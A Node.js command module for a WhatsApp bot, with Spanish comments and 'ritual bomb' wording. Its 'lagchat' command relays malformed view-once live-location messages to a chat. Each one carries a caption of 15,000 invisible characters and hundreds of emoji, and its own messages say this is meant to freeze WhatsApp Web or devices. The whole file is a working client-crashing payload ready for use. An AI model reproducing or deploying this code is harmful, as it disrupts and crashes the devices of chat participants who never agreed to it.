// 💣 lagchat.js — Invocación de bombas rituales
const { allOwners, botname } = require('../settings')

const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

module.exports = {
  command: 'lagchat',
  handler: async (conn, { message }) => {
    const from   = message.key.remoteJid
    const sender = message.key.participant || from

    // 🔥 DEBUG: invocación y owners
    console.log(`🔥 [DEBUG] Comando lagchat invocado por: ${sender}`)
    console.log('🔥 [DEBUG] allOwners:', allOwners)

    // 🔐 Validación de owner
    if (!allOwners.includes(sender)) {
      console.log(`🚫 [DEBUG] Usuario no autorizado: ${sender}`)
      return conn.sendMessage(from, {
        text: `*⛔ Acceso restringido*\n\n> Solo el gran asesor de ${botname} o los guardianes autorizados pueden liberar esta energía ritual...`
      }, { quoted: message })
    }

    // 🔁 Número de bombas rituales
    const times = 2

    // 🚨 Anuncio ceremonial
    await conn.sendMessage(from, {
      text: `*⚠️ Invocando ${times} bombas al santuario...*\n\n> Este acto puede trabar WhatsApp Web o dispositivos sensibles. Procede con respeto.`
    }, { quoted: message })

    // 💣 Invocación múltiple
    for (let i = 0; i < times; i++) {
      try {
        await conn.relayMessage(from, buildLagMessage(), { messageId: conn.generateMessageTag() })
        await new Promise(resolve => setTimeout(resolve, 200)) // ⏳ Pausa ritual
      } catch (err) {
        console.error('💥 [DEBUG] Error al enviar bomba:', err)
        return conn.sendMessage(from, {
          text: `*💥 Falla en la invocación*\n\n> El ritual se interrumpió...\n🛠️ ${err.message}`
        }, { quoted: message })
      }
    }

    // ✅ Confirmación teatral
    await conn.sendMessage(from, {
      text: `*✅ Ritual completo.*\n\n> ¿Sientes el eco en tu pantalla? 😈`
    }, { quoted: message })
  }
}